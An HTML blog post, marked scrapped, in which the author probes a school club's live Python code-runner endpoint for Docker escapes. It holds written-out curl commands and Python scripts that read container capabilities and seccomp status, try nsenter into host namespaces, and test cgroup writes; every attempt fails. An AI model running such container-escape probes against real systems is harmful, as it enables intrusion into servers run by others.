@@ -1,0 +1,241 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; style-src-attr 'unsafe-inline'">
+
+    <title>[SCRAPPED] Smashing Mort&#x27;s Server for Fun and No Profit 3 | Mataiodoxion</title>
+
+    <link rel="preload" href="https://mataiodoxion.github.io/fonts/FiraCode-Regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    <link rel="preload" href="https://mataiodoxion.github.io/fonts/FiraCode-Bold.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://mataiodoxion.github.io/css/style.css?h=e817581d198106c3ffdf">
+    <link rel="stylesheet" href="https://mataiodoxion.github.io/custom.css?h=d3281feddbb69732b7c5">
+    <script src="https://mataiodoxion.github.io/js/auto-close-popover-on-resize.js?h=4ef87d6fc7b98b22e044" defer></script>
+    <script src="https://mataiodoxion.github.io/js/copy-code-to-clipboard.js?h=6eec6d5a29e934c1de32" defer></script>
+
+    <link rel="canonical" href="https://mataiodoxion.github.io/blog/smashing-morts-server-3/">
+    <link rel="alternate" type="application/atom+xml" href="https://mataiodoxion.github.io/atom.xml" title="Mataiodoxion">
+    
+    <meta name="description" content="Since I&#x27;m bored, let&#x27;s try some Docker escapes">
+    <meta name="robots" content="index, follow">
+    <meta name="theme-color" content="#211f1a">
+    <meta name="color-scheme" content="dark">
+
+    <meta property="og:title" content="[SCRAPPED] Smashing Mort's Server for Fun and No Profit 3">
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="https://mataiodoxion.github.io/blog/smashing-morts-server-3/">
+    <meta property="og:description" content="Since I&#x27;m bored, let&#x27;s try some Docker escapes">
+    <meta property="og:site_name" content="Mataiodoxion">
+    <meta property="og:updated_time" content="2026-04-27T14:12:32.385349954-07:00">
+    <meta property="article:published_time" content="2026-01-04T00:00:00+00:00">
+    <meta property="article:tag" content="cracking">
+
+</head>
+
+<body class="layout-center" data-theme="catppuccin-mocha">
+    <header class="header">
+        <div class="header-container">
+            <span class="header-logo-container">
+                <a href="https://mataiodoxion.github.io">
+                    <span class="logo">Mataiodoxion</span>
+                </a>
+            </span>
+        </div>
+        <nav class="main-menu" aria-label="Main Menu">
+            <a class="skip-to-content" href="#main">Skip to main content</a>
+            <button class="main-menu-dropdown-button" popovertarget="nav-menu">Menu</button>
+            <ul id="nav-menu" class="main-menu-items" aria-label="Site Navigation" popover>
+                <li><a href="https://mataiodoxion.github.io/blog/">blog</a></li>
+                <li><a href="https://mataiodoxion.github.io/tags/">tags</a></li>
+            </ul>
+        </nav>
+    </header>
+    <main id="main">
+        <article class="post content">
+            <header>
+                <h1 class="post-title">
+                    <a href="https://mataiodoxion.github.io/blog/smashing-morts-server-3/">[SCRAPPED] Smashing Mort&#x27;s Server for Fun and No Profit 3</a>
+                </h1>
+                <ul class="post-meta hidden">
+                    <li title="Published on 2026-01-04"><time datetime="2026-01-04">2026.01.04</time></li>
+                    <li role="separator" aria-hidden="true">::</li>
+                </ul>
+                <div class="post-tags">
+                    <span>#<a rel="tag" href="https://mataiodoxion.github.io/tags/cracking/">cracking</a></span>
+                </div>
+            </header>
+
+<p>After "RCE exploits" (if you can even call it that since it was pretty much intended), I proposed some potential solutions I'd be interesting in working on:</p>
+<blockquote>
+<p>Regarding the python code runner (<code>python_exec_api</code>), is the intention of this endpoint to allow users to run python snippets on other FE webpages (like the JS iframes)? If so, I was thinking of considering a few options:</p>
+<ol>
+<li>
+<p><code>gVisor</code>, running each execution inside a gVisor isolated container, which would protect against syscall stuff and is pretty well maintained. However, it does come with some computational cost. This would be appropriate if we are expecting Python interaction with the filesystem.</p>
+</li>
+<li>
+<p><code>pyodide</code> (Python --&gt; WASM); so that would be executing Python entirely in the browser or a WASM runtime. This basically eliminated server-side risk and simplifies isolationn efforts, but does come with some performance costs and I/O overhead. This would definitely be the better option for lightweight, educational snippets rather than general execution.</p>
+</li>
+<li>
+<p><code>RestrictedPython</code> comes with some security enforcement of python (preventing syscalls and whatnot). This is simpler operationally, but relies on securing the language rather than sandboxxing, which could still allow for some exploits.</p>
+</li>
+</ol>
+<p>Given what I think the code runner will be used for (running simple snippets for education), I think <code>pyodide</code> would be the best option and would just include a <code>.js</code> file to load scripts and generate the editors (which I think there already is template for in <code>pages</code>).</p>
+<p>— <cite>Me, 7:49 PM PST 01-04-2026</cite></p>
+</blockquote>
+<p>But, there actually was already something in the works to mitigate this issue according to Mr. Mort:</p>
+<blockquote>
+<p>The other option is having an endpoint in a Docker container that has no sensitive info.  We have a systems team in CSA I will assign to do this.</p>
+<p>— <cite>Mr. Mortensen, 8:32 PM PST 01-04-2026</cite></p>
+</blockquote>
+<p>I thought this approach would still leave a few gaps and things to be desired. So, I began thinking of a simple way to prove this. In Mr. Mort's approach by placing the endpoint in its own API and Docker container, the RCE would still technically exist but without as much attack surface, so I figured I'd try finding a really simple container escape.</p>
+<h2 id="let-s-get-smashing">Let's Get Smashing<a class="post-anchor" href="#let-s-get-smashing" aria-label="Anchor link for: let-s-get-smashing"><span aria-hidden="true">#</span></a>
+</h2>
+<p>I first wanted to check <code>CAP</code>s because that tends to be misconfigured.</p>
+<blockquote>
+<p>[!NOTE]
+This is before CSA actually made the change, so all of these exploits are currently running on the original Docker container, but assuming that the other implementations have the same flaws, then most of these will probably work.</p>
+</blockquote>
+<p>Since the code runner endpoint was still open, I ran a query to probe the Docker image to capabilities:</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;"><code data-lang="shellscript"><span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">curl</span><span style="color: #A6E3A1;"> -X POST https://flask.opencodingsociety.com/run/python</span><span style="color: #F5C2E7;"> \</span></span>
+<span class="giallo-l"><span>-H</span><span style="color: #A6E3A1;"> &quot;Content-Type: application/json&quot;</span><span style="color: #F5C2E7;"> \</span></span>
+<span class="giallo-l"><span>-d</span><span style="color: #A6E3A1;"> &#39;{&quot;code&quot;: &quot;import os; os.system(\&quot;cat /proc/self/status | grep Cap\&quot;);&quot;}&#39;</span></span></code></pre>
+<p>I ended up receiving this output:</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;"><code data-lang="plain"><span class="giallo-l"><span>CapInh:	0000000000000000</span></span>
+<span class="giallo-l"><span>CapPrm:	00000000a80425fb</span></span>
+<span class="giallo-l"><span>CapEff:	00000000a80425fb</span></span>
+<span class="giallo-l"><span>CapBnd:	00000000a80425fb</span></span>
+<span class="giallo-l"><span>CapAmb:	0000000000000000</span></span></code></pre>
+<p>and so I ran a simple decode with <code>capsh</code>:</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;"><code data-lang="shellscript"><span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">➜</span><span style="color: #A6E3A1;"> capsh --decode=00000000a80425</span></span>
+<span class="giallo-l"><span>0x0000000000a80425</span><span style="color: #94E2D5;">=</span><span style="color: #A6E3A1;">cap_chown,cap_dac_read_search,cap_kill,cap_net_bind_service,cap_sys_ptrace,cap_sys_admin,cap_sys_nice</span></span></code></pre>
+<p>Woah! The Docker image was ran using with a <code>cap_sys_admin</code> capability which provides a pretty big attack surface for me to mess with.</p>
+<h2 id="scouting">Scouting<a class="post-anchor" href="#scouting" aria-label="Anchor link for: scouting"><span aria-hidden="true">#</span></a>
+</h2>
+<p>My first idea was to try reading via <code>/proc/1/root/</code>, but the container root only points to itself:</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;"><code data-lang="shellscript"><span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">➜</span><span style="color: #A6E3A1;"> curl -X POST https://flask.opencodingsociety.com/run/python</span><span style="color: #F5C2E7;"> \</span></span>
+<span class="giallo-l"><span>-H</span><span style="color: #A6E3A1;"> &quot;Content-Type: application/json&quot;</span><span style="color: #F5C2E7;"> \</span></span>
+<span class="giallo-l"><span>-d</span><span style="color: #A6E3A1;"> &#39;{&quot;code&quot;: &quot;import os; os.system(\&quot;cat /etc/hostname\&quot;)&quot;}&#39;</span></span>
+<span class="giallo-l"><span style="color: #9399B2;">{</span><span style="color: #89B4FA;font-style: italic;">&quot;output&quot;</span><span style="color: #F38BA8;font-style: italic;">:</span><span style="color: #A6E3A1;"> &quot;c92464b7f96a\n&quot;}</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">➜</span><span style="color: #A6E3A1;"> curl -X POST https://flask.opencodingsociety.com/run/python</span><span style="color: #F5C2E7;"> \</span></span>
+<span class="giallo-l"><span>-H</span><span style="color: #A6E3A1;"> &quot;Content-Type: application/json&quot;</span><span style="color: #F5C2E7;"> \</span></span>
+<span class="giallo-l"><span>-d</span><span style="color: #A6E3A1;"> &#39;{&quot;code&quot;: &quot;import os; os.system(\&quot;cat /proc/1/root/etc/hostname\&quot;)&quot;}&#39;</span></span>
+<span class="giallo-l"><span style="color: #9399B2;">{</span><span style="color: #89B4FA;font-style: italic;">&quot;output&quot;</span><span style="color: #F38BA8;font-style: italic;">:</span><span style="color: #A6E3A1;"> &quot;c92464b7f96a\n&quot;}</span></span></code></pre>
+<p>I then though about using mounts to mount the host filesystem and read it, but it seems that <code>seccomp</code> was blocking the mount syscall (hence <code>Seccomp: 2</code>):</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;"><code data-lang="shellscript"><span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">➜</span><span style="color: #A6E3A1;"> curl -X POST https://flask.opencodingsociety.com/run/python</span><span style="color: #F5C2E7;"> \</span></span>
+<span class="giallo-l"><span>-H</span><span style="color: #A6E3A1;"> &quot;Content-Type: application/json&quot;</span><span style="color: #F5C2E7;"> \</span></span>
+<span class="giallo-l"><span>-d</span><span style="color: #A6E3A1;"> &#39;{&quot;code&quot;: &quot;import os; os.system(\&quot;cat /proc/self/status | grep Seccomp\&quot;)&quot;}&#39;</span></span>
+<span class="giallo-l"><span style="color: #9399B2;">{</span><span style="color: #89B4FA;font-style: italic;">&quot;output&quot;</span><span style="color: #F38BA8;font-style: italic;">:</span><span style="color: #A6E3A1;"> &quot;Seccomp:\t2\nSeccomp_filters:\t1\n&quot;}</span></span></code></pre>
+<p>I then thought about using <code>nsenter</code> to run commands in namespaces, but <code>seccomp</code> is also blocking the <code>setns()</code> syscall that <code>nsenter</code> uses:</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;"><code data-lang="shellscript"><span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">➜</span><span style="color: #A6E3A1;"> curl -X POST https://flask.opencodingsociety.com/run/python</span><span style="color: #F5C2E7;"> \ </span><span style="color: #A6E3A1;">                                       -H &quot;Content-Type: application/json&quot;</span><span style="color: #F5C2E7;"> \</span></span>
+<span class="giallo-l"><span>-d</span><span style="color: #A6E3A1;"> &#39;{&quot;code&quot;: &quot;import os; os.system(\&quot;nsenter -t 1 -m cat /etc/hostname 2&gt;&amp;1\&quot;)&quot;}&#39;</span></span>
+<span class="giallo-l"><span style="color: #9399B2;">{</span><span style="color: #89B4FA;font-style: italic;">&quot;output&quot;</span><span style="color: #F38BA8;font-style: italic;">:</span><span style="color: #A6E3A1;"> &quot;nsenter: reassociate to namespaces failed: Operation not permitted\n&quot;}</span></span></code></pre>
+<p>I then moved on to trying the classic <code>cgroup</code> attack vectors:</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;"><code data-lang="python" data-name="cgroups.py"><span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 1</span><span style="color: #CBA6F7;">import</span><span> os</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 2</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 3</span><span>cgroup_base</span><span style="color: #94E2D5;"> =</span><span style="color: #A6E3A1;"> &quot;/sys/fs/cgroup&quot;</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 4</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 5</span><span>test_files</span><span style="color: #94E2D5;"> =</span><span style="color: #9399B2;"> [</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 6</span><span style="color: #A6E3A1;">    &quot;cgroup.subtree_control&quot;</span><span style="color: #9399B2;">,</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 7</span><span style="color: #A6E3A1;">    &quot;cgroup.procs&quot;</span><span style="color: #9399B2;">,</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 8</span><span style="color: #A6E3A1;">    &quot;memory.high&quot;</span><span style="color: #9399B2;">,</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 9</span><span style="color: #A6E3A1;">    &quot;cpu.weight&quot;</span><span style="color: #9399B2;">,</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">10</span><span style="color: #9399B2;">]</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">11</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">12</span><span style="color: #FAB387;font-style: italic;">print</span><span style="color: #9399B2;">(</span><span style="color: #A6E3A1;">&quot;[!] Testing write access to cgroup files&quot;</span><span style="color: #9399B2;">)</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">13</span><span style="color: #CBA6F7;">for</span><span> test_file</span><span style="color: #CBA6F7;"> in</span><span> test_files</span><span style="color: #9399B2;">:</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">14</span><span>    path</span><span style="color: #94E2D5;"> =</span><span style="color: #A6E3A1;font-style: italic;"> f</span><span style="color: #A6E3A1;">&quot;</span><span style="color: #F5C2E7;">{</span><span>cgroup_base</span><span style="color: #F5C2E7;">}</span><span style="color: #A6E3A1;">/</span><span style="color: #F5C2E7;">{</span><span>test_file</span><span style="color: #F5C2E7;">}</span><span style="color: #A6E3A1;">&quot;</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">15</span><span style="color: #CBA6F7;">    if not</span><span> os</span><span style="color: #9399B2;">.</span><span>path</span><span style="color: #9399B2;">.</span><span style="color: #89B4FA;">exists</span><span style="color: #9399B2;">(</span><span>path</span><span style="color: #9399B2;">):</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">16</span><span style="color: #CBA6F7;">        continue</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">17</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">18</span><span style="color: #CBA6F7;">    try</span><span style="color: #9399B2;">:</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">19</span><span style="color: #9399B2;font-style: italic;">        # Try to read first</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">20</span><span style="color: #CBA6F7;">        with</span><span style="color: #FAB387;font-style: italic;"> open</span><span style="color: #9399B2;">(</span><span>path</span><span style="color: #9399B2;">,</span><span style="color: #A6E3A1;"> &quot;r&quot;</span><span style="color: #9399B2;">)</span><span style="color: #CBA6F7;"> as</span><span> f</span><span style="color: #9399B2;">:</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">21</span><span>            content</span><span style="color: #94E2D5;"> =</span><span> f</span><span style="color: #9399B2;">.</span><span style="color: #89B4FA;">read</span><span style="color: #9399B2;">().</span><span style="color: #89B4FA;">strip</span><span style="color: #9399B2;">()</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">22</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">23</span><span style="color: #9399B2;font-style: italic;">        # Try to write the same content back</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">24</span><span style="color: #CBA6F7;">        try</span><span style="color: #9399B2;">:</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">25</span><span style="color: #CBA6F7;">            with</span><span style="color: #FAB387;font-style: italic;"> open</span><span style="color: #9399B2;">(</span><span>path</span><span style="color: #9399B2;">,</span><span style="color: #A6E3A1;"> &quot;w&quot;</span><span style="color: #9399B2;">)</span><span style="color: #CBA6F7;"> as</span><span> f</span><span style="color: #9399B2;">:</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">26</span><span>                f</span><span style="color: #9399B2;">.</span><span style="color: #89B4FA;">write</span><span style="color: #9399B2;">(</span><span>content</span><span style="color: #CBA6F7;"> if</span><span> content</span><span style="color: #CBA6F7;"> else</span><span style="color: #A6E3A1;"> &quot;&quot;</span><span style="color: #9399B2;">)</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">27</span><span style="color: #FAB387;font-style: italic;">            print</span><span style="color: #9399B2;">(</span><span style="color: #A6E3A1;font-style: italic;">f</span><span style="color: #A6E3A1;">&quot;[!] </span><span style="color: #F5C2E7;">{</span><span>test_file</span><span style="color: #F5C2E7;">}</span><span style="color: #A6E3A1;"> - WRITABLE&quot;</span><span style="color: #9399B2;">)</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">28</span><span style="color: #FAB387;font-style: italic;">            print</span><span style="color: #9399B2;">(</span><span style="color: #A6E3A1;font-style: italic;">f</span><span style="color: #A6E3A1;">&quot;[!] Current: </span><span style="color: #F5C2E7;">{</span><span style="color: #EBA0AC;font-style: italic;">content</span><span style="color: #9399B2;">[:</span><span style="color: #FAB387;font-style: italic;">50</span><span style="color: #9399B2;">]</span><span style="color: #F5C2E7;">}</span><span style="color: #A6E3A1;">&quot;</span><span style="color: #9399B2;">)</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">29</span><span style="color: #CBA6F7;">        except</span><span style="color: #FAB387;font-style: italic;"> PermissionError</span><span style="color: #9399B2;">:</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">30</span><span style="color: #FAB387;font-style: italic;">            print</span><span style="color: #9399B2;">(</span><span style="color: #A6E3A1;font-style: italic;">f</span><span style="color: #A6E3A1;">&quot;[X] </span><span style="color: #F5C2E7;">{</span><span>test_file</span><span style="color: #F5C2E7;">}</span><span style="color: #A6E3A1;"> - read-only&quot;</span><span style="color: #9399B2;">)</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">31</span><span style="color: #CBA6F7;">        except</span><span style="color: #FAB387;font-style: italic;"> Exception</span><span style="color: #CBA6F7;"> as</span><span> e</span><span style="color: #9399B2;">:</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">32</span><span style="color: #FAB387;font-style: italic;">            print</span><span style="color: #9399B2;">(</span><span style="color: #A6E3A1;font-style: italic;">f</span><span style="color: #A6E3A1;">&quot;[X] </span><span style="color: #F5C2E7;">{</span><span>test_file</span><span style="color: #F5C2E7;">}</span><span style="color: #A6E3A1;"> - </span><span style="color: #F5C2E7;">{</span><span>e</span><span style="color: #F5C2E7;">}</span><span style="color: #A6E3A1;">&quot;</span><span style="color: #9399B2;">)</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">33</span><span style="color: #CBA6F7;">    except</span><span style="color: #FAB387;font-style: italic;"> Exception</span><span style="color: #CBA6F7;"> as</span><span> e</span><span style="color: #9399B2;">:</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">34</span><span style="color: #FAB387;font-style: italic;">        print</span><span style="color: #9399B2;">(</span><span style="color: #A6E3A1;font-style: italic;">f</span><span style="color: #A6E3A1;">&quot;[X] </span><span style="color: #F5C2E7;">{</span><span>test_file</span><span style="color: #F5C2E7;">}</span><span style="color: #A6E3A1;"> - cannot read: </span><span style="color: #F5C2E7;">{</span><span>e</span><span style="color: #F5C2E7;">}</span><span style="color: #A6E3A1;">&quot;</span><span style="color: #9399B2;">)</span></span></code></pre><pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;"><code data-lang="shellscript"><span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">➜</span><span style="color: #A6E3A1;"> mataiodoxion flask python code2json.py cgroups.py --compact</span><span style="color: #94E2D5;"> |</span><span style="color: #89B4FA;font-style: italic;"> curl</span><span style="color: #A6E3A1;"> -X POST https://flask.opencodingsociety.com/run/python</span><span style="color: #F5C2E7;"> \</span></span>
+<span class="giallo-l"><span>-H</span><span style="color: #A6E3A1;"> &quot;Content-Type: application/json&quot;</span><span style="color: #F5C2E7;"> \</span></span>
+<span class="giallo-l"><span>-d</span><span style="color: #A6E3A1;"> @-</span></span></code></pre><pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;"><code data-lang="plain"><span class="giallo-l"><span>[!] Testing write access to cgroup files</span></span>
+<span class="giallo-l"><span>[X] cgroup.subtree_control - [Errno 30] Read-only file system: &#39;/sys/fs/cgroup/cgroup.subtree_control&#39;</span></span>
+<span class="giallo-l"><span>[X] cgroup.procs - [Errno 30] Read-only file system: &#39;/sys/fs/cgroup/cgroup.procs&#39;</span></span>
+<span class="giallo-l"><span>[X] memory.high - [Errno 30] Read-only file system: &#39;/sys/fs/cgroup/memory.high&#39;</span></span>
+<span class="giallo-l"><span>[X] cpu.weight - [Errno 30] Read-only file system: &#39;/sys/fs/cgroup/cpu.weight&#39;</span></span></code></pre>
+<p>And also trying to create new <code>cgroups</code>:</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;"><code data-lang="python" data-name="cgroups_new.py"><span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 1</span><span style="color: #CBA6F7;">import</span><span> os</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 2</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 3</span><span>cgroup_base</span><span style="color: #94E2D5;"> =</span><span style="color: #A6E3A1;"> &quot;/sys/fs/cgroup&quot;</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 4</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 5</span><span style="color: #CBA6F7;">try</span><span style="color: #9399B2;">:</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 6</span><span>    test_cgroup</span><span style="color: #94E2D5;"> =</span><span style="color: #A6E3A1;font-style: italic;"> f</span><span style="color: #A6E3A1;">&quot;</span><span style="color: #F5C2E7;">{</span><span>cgroup_base</span><span style="color: #F5C2E7;">}</span><span style="color: #A6E3A1;">/escape_test&quot;</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 7</span><span>    os</span><span style="color: #9399B2;">.</span><span style="color: #89B4FA;">makedirs</span><span style="color: #9399B2;">(</span><span>test_cgroup</span><span style="color: #9399B2;">,</span><span style="color: #EBA0AC;font-style: italic;"> exist_ok</span><span style="color: #94E2D5;">=</span><span style="color: #FAB387;">True</span><span style="color: #9399B2;">)</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 8</span><span style="color: #FAB387;font-style: italic;">    print</span><span style="color: #9399B2;">(</span><span style="color: #A6E3A1;font-style: italic;">f</span><span style="color: #A6E3A1;">&quot;[!] Created </span><span style="color: #F5C2E7;">{</span><span>test_cgroup</span><span style="color: #F5C2E7;">}</span><span style="color: #A6E3A1;">&quot;</span><span style="color: #9399B2;">)</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 9</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">10</span><span style="color: #9399B2;font-style: italic;">    # Check if notify_on_release exists in v2</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">11</span><span>    files_created</span><span style="color: #94E2D5;"> =</span><span> os</span><span style="color: #9399B2;">.</span><span style="color: #89B4FA;">listdir</span><span style="color: #9399B2;">(</span><span>test_cgroup</span><span style="color: #9399B2;">)</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">12</span><span style="color: #FAB387;font-style: italic;">    print</span><span style="color: #9399B2;">(</span><span style="color: #A6E3A1;font-style: italic;">f</span><span style="color: #A6E3A1;">&quot;[!] Files in new cgroup: </span><span style="color: #F5C2E7;">{</span><span style="color: #EBA0AC;font-style: italic;">files_created</span><span style="color: #9399B2;">[:</span><span style="color: #FAB387;font-style: italic;">5</span><span style="color: #9399B2;">]</span><span style="color: #F5C2E7;">}</span><span style="color: #A6E3A1;">&quot;</span><span style="color: #9399B2;">)</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">13</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">14</span><span style="color: #9399B2;font-style: italic;">    # Clean up</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">15</span><span>    os</span><span style="color: #9399B2;">.</span><span style="color: #89B4FA;">rmdir</span><span style="color: #9399B2;">(</span><span>test_cgroup</span><span style="color: #9399B2;">)</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">16</span><span style="color: #FAB387;font-style: italic;">    print</span><span style="color: #9399B2;">(</span><span style="color: #A6E3A1;">&quot;[!] Cleaned up test cgroup&quot;</span><span style="color: #9399B2;">)</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">17</span><span style="color: #CBA6F7;">except</span><span style="color: #FAB387;font-style: italic;"> Exception</span><span style="color: #CBA6F7;"> as</span><span> e</span><span style="color: #9399B2;">:</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">18</span><span style="color: #FAB387;font-style: italic;">    print</span><span style="color: #9399B2;">(</span><span style="color: #A6E3A1;font-style: italic;">f</span><span style="color: #A6E3A1;">&quot;[X] Cannot create cgroup: </span><span style="color: #F5C2E7;">{</span><span>e</span><span style="color: #F5C2E7;">}</span><span style="color: #A6E3A1;">&quot;</span><span style="color: #9399B2;">)</span></span></code></pre><pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;"><code data-lang="shellscript"><span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">➜</span><span style="color: #A6E3A1;"> python code2json.py cgroups_new.py --compact</span><span style="color: #94E2D5;"> |</span><span style="color: #89B4FA;font-style: italic;"> curl</span><span style="color: #A6E3A1;"> -X POST https://flask.opencodingsociety.com/run/python</span><span style="color: #F5C2E7;"> \</span></span>
+<span class="giallo-l"><span>-H</span><span style="color: #A6E3A1;"> &quot;Content-Type: application/json&quot;</span><span style="color: #F5C2E7;"> \</span></span>
+<span class="giallo-l"><span>-d</span><span style="color: #A6E3A1;"> @-</span></span></code></pre><pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;"><code data-lang="plain"><span class="giallo-l"><span>[X] Cannot create cgroup: [Errno 30] Read-only file system: &#39;/sys/fs/cgroup/escape_test&#39;</span></span></code></pre>
+        </article>
+        <nav class="post-navigation">
+            <header class="post-navigation-title">
+                <h2>Read More Posts</h2>
+                <hr>
+            </header>
+            <div class="post-navigation-buttons">
+                <a rel="next" href="https://mataiodoxion.github.io/blog/fock-flock/" aria-label="Next article">
+                    <span aria-hidden="true">&lt;&nbsp;[</span>Fock Flock<span aria-hidden="true">]</span>
+                </a>
+                <span aria-hidden="true" role="separator">::</span>
+                <a rel="prev" href="https://mataiodoxion.github.io/blog/smashing-morts-server-2/" aria-label="Prev article">
+                    <span aria-hidden="true">[</span>Smashing Mort&#x27;s Server for Fun and No Profit 2<span aria-hidden="true">]&nbsp;&gt;</span>
+                </a>
+            </div>
+        </nav>
+    </main>
+    <footer class="footer">
+        <address class="socials">
+            <ul>
+                <li>
+                    <a class="social-link" href="https://mataiodoxion.github.io/atom.xml" title="atom feed" aria-label="atom feed">
+                        <svg role="img" aria-label="feed icon">
+                            <use aria-hidden="true" href="https://mataiodoxion.github.io/images/social_icons/atom.svg#icon" />
+                        </svg>
+                    </a>
+                </li>
+                <li>
+                    <a class="social-link" rel="me" href="mailto:mataiodoxion@protonmail.com" title="email" aria-label="email">
+                        <svg role="img" aria-label="email icon">
+                            <use aria-hidden="true" href="https://mataiodoxion.github.io/images/social_icons/email.svg#icon" />
+                        </svg>
+                    </a>
+                </li>
+            </ul>
+        </address>
+        <p class="copyright">
+            <span>© <time>2026</time></span>
+            <span>Powered by <a rel="external" href="https://www.getzola.org">Zola</a></span>
+            <span>Theme by <a rel="external" href="https://eyalkalderon.com">ebkalderon</a></span>
+        </p>
+    </footer>
+</body>
+
+</html>
